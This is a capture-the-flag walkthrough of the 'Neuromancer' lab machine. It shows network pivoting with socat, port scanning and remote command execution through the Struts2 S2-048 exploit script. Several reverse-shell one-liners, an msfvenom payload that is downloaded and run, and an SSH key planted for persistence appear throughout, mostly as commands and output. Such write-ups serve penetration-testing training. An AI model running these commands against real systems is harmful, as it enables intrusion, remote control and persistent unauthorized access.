<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div># cat note.txt</div>
    <div>Devs,</div>
    <div>
        <div><br /></div>
    </div>
    <div>Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.</div>
    <div>
        <div><br /></div>
    </div>
    <div>The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Anyways, we've deployed the war file on tomcat as ordered - located here:</div>
    <div>
        <div><br /></div>
    </div>
    <div>/struts2_2.3.15.1-showcase</div>
    <div>
        <div><br /></div>
    </div>
    <div>It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Regards,</div>
    <div>
        <div><br /></div>
    </div>
    <div>Bob Laugh</div>
    <div>Turing Systems Engineer II</div>
    <div>Freeside//Straylight//Ops5</div>
</div>
<div><br /></div>
<div>This note gives us the URL we'll target on our second machine. Now, we just have to figure out how to get there.</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Pivoting</h2>
</div>
<div><br /></div>
<div>The first thing we need to do is determine which networks are available from our compromised system. There are lots of ways we can do that, but we'll start with ifconfig.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@straylight:/root# ifconfig</div>
    <div>enp0s3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;Â Â mtu 1500</div>
    <div>Â Â Â Â Â Â Â Â inet 10.183.0.211Â Â netmask 255.255.255.0Â Â broadcast 10.183.0.255</div>
    <div>Â Â Â Â Â Â Â Â inet6 fe80::a00:27ff:fe50:96d9Â Â prefixlen 64Â Â scopeid 0x20&lt;link&gt;</div>
    <div>Â Â Â Â Â Â Â Â ether 08:00:27:50:96:d9Â Â txqueuelen 1000Â Â (Ethernet)</div>
    <div>Â Â Â Â Â Â Â Â RX packets 2523046Â Â bytes 491110659 (468.3 MiB)</div>
    <div>Â Â Â Â Â Â Â Â RX errors 0Â Â dropped 0Â Â overruns 0Â Â frame 0</div>
    <div>Â Â Â Â Â Â Â Â TX packets 2508477Â Â bytes 1236698801 (1.1 GiB)</div>
    <div>Â Â Â Â Â Â Â Â TX errors 0Â Â dropped 0 overruns 0Â Â carrier 0Â Â collisions 0</div>
    <div>
        <div><br /></div>
    </div>
    <div>enp0s8: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;Â Â mtu 1500</div>
    <div>Â Â Â Â Â Â Â Â inet 192.168.56.102Â Â netmask 255.255.255.0Â Â broadcast 192.168.56.255</div>
    <div>Â Â Â Â Â Â Â Â inet6 fe80::a00:27ff:fea9:7af0Â Â prefixlen 64Â Â scopeid 0x20&lt;link&gt;</div>
    <div>Â Â Â Â Â Â Â Â ether 08:00:27:a9:7a:f0Â Â txqueuelen 1000Â Â (Ethernet)</div>
    <div>Â Â Â Â Â Â Â Â RX packets 140Â Â bytes 52630 (51.3 KiB)</div>
    <div>Â Â Â Â Â Â Â Â RX errors 0Â Â dropped 0Â Â overruns 0Â Â frame 0</div>
    <div>Â Â Â Â Â Â Â Â TX packets 40Â Â bytes 6314 (6.1 KiB)</div>
    <div>Â Â Â Â Â Â Â Â TX errors 0Â Â dropped 0 overruns 0Â Â carrier 0Â Â collisions 0</div>
    <div>
        <div><br /></div>
    </div>
    <div>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;Â Â mtu 65536</div>
    <div>Â Â Â Â Â Â Â Â inet 127.0.0.1Â Â netmask 255.0.0.0</div>
    <div>Â Â Â Â Â Â Â Â inet6 ::1Â Â prefixlen 128Â Â scopeid 0x10&lt;host&gt;</div>
    <div>Â Â Â Â Â Â Â Â loopÂ Â txqueuelen 1Â Â (Local Loopback)</div>
    <div>Â Â Â Â Â Â Â Â RX packets 345815Â Â bytes 30093643 (28.6 MiB)</div>
    <div>Â Â Â Â Â Â Â Â RX errors 0Â Â dropped 0Â Â overruns 0Â Â frame 0</div>
    <div>Â Â Â Â Â Â Â Â TX packets 345815Â Â bytes 30093643 (28.6 MiB)</div>
    <div>Â Â Â Â Â Â Â Â TX errors 0Â Â dropped 0 overruns 0Â Â carrier 0Â Â collisions 0</div>
</div>
<div><br /></div>
<div>It looks like the new subnet we'll be trying to reach isÂ 192.168.56.0/24. We'll do a very quick ping sweep (all hosts in parallel) from the victim machine to see what is alive on the subnet.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@straylight:/root# for i in {1..254} ;do (ping -c 1 192.168.56.$i | grep "bytes from" &amp;) ;done</div>
    <div>64 bytes from 192.168.56.1: icmp_seq=1 ttl=64 time=0.338 ms</div>
    <div>64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=0.027 ms</div>
    <div>64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=1.35 ms</div>
</div>
<div><br /></div>
<div>The .1 address is likely the gateway, so we'll target theÂ 192.168.56.101 address. We'll use netcat on the victim machine to do a quick portscan.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@straylight:/root# for p in $(seq 1 65535); do (nc -nvzw1 192.168.56.101 $p 2&gt;&amp;1 | grep open &amp;) ;done</div>
    <div>(UNKNOWN) [192.168.56.101] 1194 (openvpn) : Connection refused</div>
    <div>(UNKNOWN) [192.168.56.101] 8009 (?) open</div>
    <div>(UNKNOWN) [192.168.56.101] 8080 (http-alt) open</div>
    <div>(UNKNOWN) [192.168.56.101] 34483 (?) open</div>
</div>
<div><br /></div>
<div>Looks like we have three open ports (the 'openvpn' port just showed up because we grepped 'open'). We'll use socat on our victim to make the open ports on the internal system available to our attacking machine. We'll also open one port on the victim that will allow the internal machine to reach our attacking machine (in case we want to transfer files to it or have it connect back a reverse shell).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@straylight:/root# socat tcp-listen:8009,fork tcp:192.168.56.101:8009 &amp;</div>
    <div>[1] 11720<br /></div>
    <div>root@straylight:/root# socat tcp-listen:8080,fork tcp:192.168.56.101:8080 &amp;</div>
    <div>[2] 11721</div>
    <div>root@straylight:/root# socat tcp-listen:34483,fork tcp:192.168.56.101:34483 &amp;</div>
    <div>[3] 11722</div>
    <div>root@straylight:/root# socat tcp-listen:4321,fork tcp:10.183.0.222:4321 &amp;</div>
    <div>[4] 11723</div>
</div>
<div><br /></div>
<div>Before connecting to the identified HTTP service on TCP port 8080, I'll use netcat to connect to the other two services just to see if we can tell anything about them.</div>
<div><br /></div>
<div>Connecting to TCP port 8009 doesn't return anything. However, connecting to TCP portÂ 34483 returns...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@straylight:/root# nc 192.168.56.101 34483</div>
    <div>nc 192.168.56.101 34483</div>
    <div>SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4</div>
    <div>
        <div><br /></div>
    </div>
    <div>Protocol mismatch.</div>
</div>
<div><br /></div>
<div>So, we can probably SSH to the server on TCP port 34483 if we get some credentials.</div>
<div><br /></div>
<div>OK. Let's use the URL from our note in /root and visitÂ <a href="http://10.183.0.211:8080/struts2_2.3.15.1-showcase">http://10.183.0.211:8080/struts2_2.3.15.1-showcase</a></div>
<div><br /></div>
<div>The site exists and looks like it has lots of "attack surface". Let's check the exploit database.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Apache Struts 2.3.x Showcase - Remote Code ExecutionÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/multiple/webapps/42324.py</div>
</div>
<div><br /></div>
<div>Looks like we have a known remote code issue with the demo site. Not a big surprise. I'll copy the python script and see what we need to do to make it work.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# cp /usr/share/exploitdb/exploits/multiple/webapps/42324.py .</div>
    <div>root@kali:~/Walkthroughs/wintermute# dos2unix 42324.py</div>
    <div>root@kali:~/Walkthroughs/wintermute# python 42324.py</div>
    <div>python 42324.py &lt;url&gt; &lt;cmd&gt;</div>
</div>
<div><br /></div>
<div>Looks like the script wants a URL and a CMD. That doesn't probably tell me enough about what it's going to do, so I'll dig more into the code. There is a comment at the bottom of the code that gives me a good example.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div># $ ncat -v -l -p 4444 &amp;</div>
    <div># $ python exploit_S2-048.py http://127.0.0.1:8080/2.3.15.1-showcase/integration/saveGangster.action "ncat -e /bin/bash 127.0.0.1 4444"</div>
</div>
<div><br /></div>
<div>I'll go ahead and start a listener in metasploit on the one port the protected system can reach me on (thanks to socat).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 &gt; use exploit/multi/handler</div>
    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
    <div>payload =&gt; generic/shell_reverse_tcp</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
    <div>msf5 exploit(multi/handler) &gt; set LPORT 4321</div>
    <div>LPORT =&gt; 4321</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 2.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:4321</div>
</div>
<div><br /></div>
<div>Now it is time to craft my script parameters. You never know if a host is going to support the -e option of netcat, so we might have to try multiple different types of reverse shell. Also note, we are sending the reverse shell back to 192.168.56.102, which should relay that to our attacking machine. First, we'll try the following...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# python 42324.py http://10.183.0.211:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "nc -e /bin/sh 192.168.56.102 4321"</div>
    <div>[*] exploit Apache Struts2 S2-048</div>
    <div>[+] command: nc -e /bin/sh 192.168.56.102 4321</div>
</div>
<div><br /></div>
<div>Well, no session was created in Metasploit. Not a big surprise. Let's see if we can start a shell using perl or python.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# python 42324.py http://10.183.0.211:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "perl -e 'use Socket;$i=\"192.168.56.102\";$p=4321;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'"</div>
    <div>[*] exploit Apache Struts2 S2-048</div>
    <div>[+] command: perl -e 'use Socket;="192.168.56.102";=4321;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(,inet_aton()))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# python 42324.py http://10.183.0.211:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.102\",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</div>
    <div>[*] exploit Apache Struts2 S2-048</div>
    <div>[+] command: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div>
</div>
<div><br /></div>
<div>Nope! To be honest, these commands are pretty complex and probably more than the Java interpreter will allow. Maybe we can call wget and have the server download a reverse shell payload, then make a second call to execute the payload.</div>
<div><br /></div>
<div>We'll use msfvenom to create our reverse shell payload. We don't know the architecture of the remote system, but the victim we've already compromised in x64, so we'll start with that.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4321 -f elf -o pwn</div>
    <div>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</div>
    <div>[-] No arch selected, selecting arch: x64 from the payload</div>
    <div>No encoder or badchars specified, outputting raw payload</div>
    <div>Payload size: 74 bytes</div>
    <div>Final size of elf file: 194 bytes</div>
    <div>Saved as: pwn</div>
</div>
<div><br /></div>
<div>We'll use the python SimpleHTTPServer to host our payload and hope the remote system has wget so it can download it. Also, because we only opened one port back to our attacking machine, we'll have to stop our Metasploit listener on TCP port 4321 so we can start our SimpleHTTPServer. Once we've transferred the file, we can restart the listener.</div>
<div><br /></div>
<div>We transfer the file... AND set it as executable... (in two separate calls)...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# python 42324.py http://10.183.0.211:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget -O /tmp/pwn 192.168.56.102:4321/pwn"Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â [*] exploit Apache Struts2 S2-048</div>
    <div>[+] command: wget -O /tmp/pwn 192.168.56.102:4321/pwn</div>
    <div>root@kali:~/Walkthroughs/wintermute# python 42324.py http://10.183.0.211:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/pwn"</div>
    <div>[*] exploit Apache Struts2 S2-048</div>
    <div>[+] command: chmod +x /tmp/pwn</div>
</div>
<div><br /></div>
<div>Stop the SimpleHTTPServer and restart our Metasploit listener... then try to execute the file...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# python 42324.py http://10.183.0.211:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/pwn"</div>
    <div>[*] exploit Apache Struts2 S2-048</div>
    <div>[+] command: chmod +x /tmp/pwn</div>
    <div>root@kali:~/Walkthroughs/wintermute# python 42324.py http://10.183.0.211:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "/tmp/pwn"Â Â Â Â [*] exploit Apache Struts2 S2-048</div>
    <div>[+] command: /tmp/pwn</div>
</div>
<div><br /></div>
<div>Checking Metasploit and...<br /></div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 3 opened (10.183.0.222:4321 -&gt; 10.183.0.211:44336) at 2019-05-01 16:34:59 -0400</div>
    <div>
        <div><br /></div>
    </div>
    <div>msf5 exploit(multi/handler) &gt; sessions 3</div>
    <div>[*] Starting interaction with 3...</div>
    <div>
        <div><br /></div>
    </div>
    <div>pwd</div>
    <div>/</div>
    <div>id</div>
    <div>uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</div>
</div>
<div><br /></div>
<div>It worked! We have our session on the remote machine.</div>
<div><br /></div>
<div>Checking /etc/passwd, we find out the following about our account.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>ta@neuromancer:/var$ grep `whoami` /etc/passwd</div>
    <div>ta:x:1000:1000:Tessier-Ashpool,,,:/home/ta:/bin/bash</div>
</div>
<div><br /></div>
<div>Looks like we should be able to set up SSH keys for our account and SSH to the system over TCP portÂ 34483.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>ta@neuromancer:/home/ta$ ls -laF</div>
    <div>total 56</div>
    <div>drwxr-xr-x 6 taÂ Â Â taÂ Â Â 4096 JulÂ Â 1Â Â 2018 ./</div>
    <div>drwxr-xr-x 4 root root 4096 JulÂ Â 1Â Â 2018 ../</div>
    <div>-rw------- 1 taÂ Â Â taÂ Â Â Â Â 54 JulÂ Â 3Â Â 2018 .bash_history</div>
    <div>-rw-r--r-- 1 taÂ Â Â taÂ Â Â Â 220 May 18Â Â 2018 .bash_logout</div>
    <div>-rw-r--r-- 1 taÂ Â Â taÂ Â Â 3900 May 18Â Â 2018 .bashrc</div>
    <div>drwx------ 2 taÂ Â Â taÂ Â Â 4096 May 18Â Â 2018 .cache/</div>
    <div>drwxrwxr-x 3 taÂ Â Â taÂ Â Â 4096 May 18Â Â 2018 .m2/</div>
    <div>drwxrwxr-x 2 taÂ Â Â taÂ Â Â 4096 May 18Â Â 2018 .oracle_jre_usage/</div>
    <div>-rw-r--r-- 1 taÂ Â Â taÂ Â Â Â 655 May 18Â Â 2018 .profile</div>
    <div>-rw------- 1 taÂ Â Â taÂ Â Â 4538 JulÂ Â 1Â Â 2018 .viminfo</div>
    <div>-rw-rw-r-- 1 taÂ Â Â taÂ Â Â Â 352 JulÂ Â 1Â Â 2018 ai-gui-guide.txt</div>
    <div>drwxrwxr-x 4 taÂ Â Â taÂ Â Â 4096 May 18Â Â 2018 myWebApp/</div>
    <div>-rw-r----- 1 taÂ Â Â taÂ Â Â Â Â 82 May 18Â Â 2018 velocity.log</div>
    <div>ta@neuromancer:/home/ta$ mkdir .ssh</div>
    <div>ta@neuromancer:/home/ta$ cd .ssh</div>
    <div>ta@neuromancer:/home/ta/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChngLDhjAg2kqWpnqjnQNJNYpE4eRKgQHrDc6r1SS8L23ur47+Au6cQR0b6dJqZ6/zfDjXQCZnKcBB5nPZQ7lh85wzqUowy+V5HbBc3catzxJe8OY3SYgxH9KQyRPMSdhcGv0/+n5ZmB6eP/aA0JHtmPf+LS1pgLQWuC0aZMdpj9pkjGSubClHjDBckhqBDkrUB9cF7+Z7ZCrdfQWgZyZDjnWjcF5VLbbCfmyWRKnG9mxHL31eS2V8OKdMvAgqAo3pyw19VT4y8dwcMdnSZ4VHFLzybvpMx5Qh0OTvfKHcLEUildKiHrMBoerBaYVSHtabnXE8bX1psjPjNOS8d9P1 root@kali" &gt; authorized_keys<br /></div>
    <div>&lt;SHtabnXE8bX1psjPjNOS8d9P1 root@kali" &gt; authorized_keys</div>
</div>
<div><br /></div>
<div>Now we will SSH to the system on our published socket through the original victim...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# ssh -i neuromancer-ta -p 34483 ta@10.183.0.211</div>
    <div>The authenticity of host '[10.183.0.211]:34483 ([10.183.0.211]:34483)' can't be established.</div>
    <div>ECDSA key fingerprint is SHA256:oUL2wjfAFRqayjqOgc79xVYeSqvD92zqaV+4udNxJrw.</div>
    <div>Are you sure you want to continue connecting (yes/no)? yes</div>
    <div>Warning: Permanently added '[10.183.0.211]:34483' (ECDSA) to the list of known hosts.</div>
    <div> ----------------------------------------------------------------</div>
    <div>|Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Neuromancer Secure Remote AccessÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â |</div>
    <div>| UNAUTHORIZED ACCESS will be investigated by the Turing PoliceÂ Â |</div>
    <div> ----------------------------------------------------------------</div>
    <div>Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</div>
    <div>
        <div><br /></div>
    </div>
    <div> * Documentation:Â Â https://help.ubuntu.com</div>
    <div> * Management:Â Â Â Â Â https://landscape.canonical.com</div>
    <div> * Support:Â Â Â Â Â Â Â Â https://ubuntu.com/advantage</div>
    <div>
        <div><br /></div>
    </div>
    <div>94 packages can be updated.</div>
    <div>44 updates are security updates.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Last login: Tue JulÂ Â 3 21:53:25 2018</div>
    <div>ta@neuromancer:~$</div>
</div>
<div><br /></div>
<div>Nice to be in a fully functional shell!Â ðŸ˜Ž</div>
<div><br /></div>
<div>Checking the running kernel and os...<br /></div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>ta@neuromancer:/etc$ uname -a</div>
    <div>Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</div>
    <div>ta@neuromancer:/etc$ cat /etc/os-release </div>
    <div>NAME="Ubuntu"</div>
    <div>VERSION="16.04.4 LTS (Xenial Xerus)"</div>
    <div>ID=ubuntu</div>
    <div>ID_LIKE=debian</div>
    <div>PRETTY_NAME="Ubuntu 16.04.4 LTS"</div>
    <div>VERSION_ID="16.04"</div>
    <div>HOME_URL="http://www.ubuntu.com/"</div>
    <div>SUPPORT_URL="http://help.ubuntu.com/"</div>
    <div>BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"</div>
    <div>VERSION_CODENAME=xenial</div>
    <div>UBUNTU_CODENAME=xenial</div>
</div>
<div><br /></div>
<div>There's one very specific issue listed in the exploit database that seems to match...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege EscalationÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/local/44298.c</div>
</div>
<div><br /></div>
<div>Even though it is listed as "&lt; 4.4.0-116", looking at the code, it seems to be tested against kernel 4.4.0-116. Unfortunately, gcc is not available on the remote machine.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>ta@neuromancer:/etc$ gcc -h</div>
    <div>The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'</div>
</div>
<div><br /></div>
